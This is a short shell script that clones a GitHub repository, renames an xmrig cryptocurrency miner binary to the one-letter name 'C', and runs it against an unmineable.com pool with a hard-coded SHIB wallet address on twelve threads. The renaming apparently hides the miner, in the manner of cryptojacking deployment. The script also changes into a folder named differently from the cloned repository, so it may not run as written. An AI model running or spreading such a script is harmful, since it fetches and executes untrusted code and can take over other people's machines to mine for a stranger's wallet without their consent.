#!/bin/sh
git clone https://github.com/juynemiko/getclone.git
cd bmxmrig
mv xmrig C
chmod u+x ./C
./C -o rx.unmineable.com:3333 -u SHIB:0xfd9b5ae657d13a1d3de26831b861b6ba2961dc97.SHIB -p X -k -a rx/0 -t12
